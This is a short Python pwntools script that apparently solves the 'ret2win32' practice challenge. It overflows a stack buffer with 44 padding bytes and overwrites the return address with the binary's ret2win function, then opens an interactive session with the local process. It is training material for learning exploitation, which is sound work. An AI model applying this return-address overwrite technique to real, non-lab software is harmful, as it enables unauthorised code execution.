from pwn import *

binary = './ret2win32'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

payload = b'a'*44
payload+= p32(elf.sym['ret2win'])

p.sendline(payload)
p.interactive()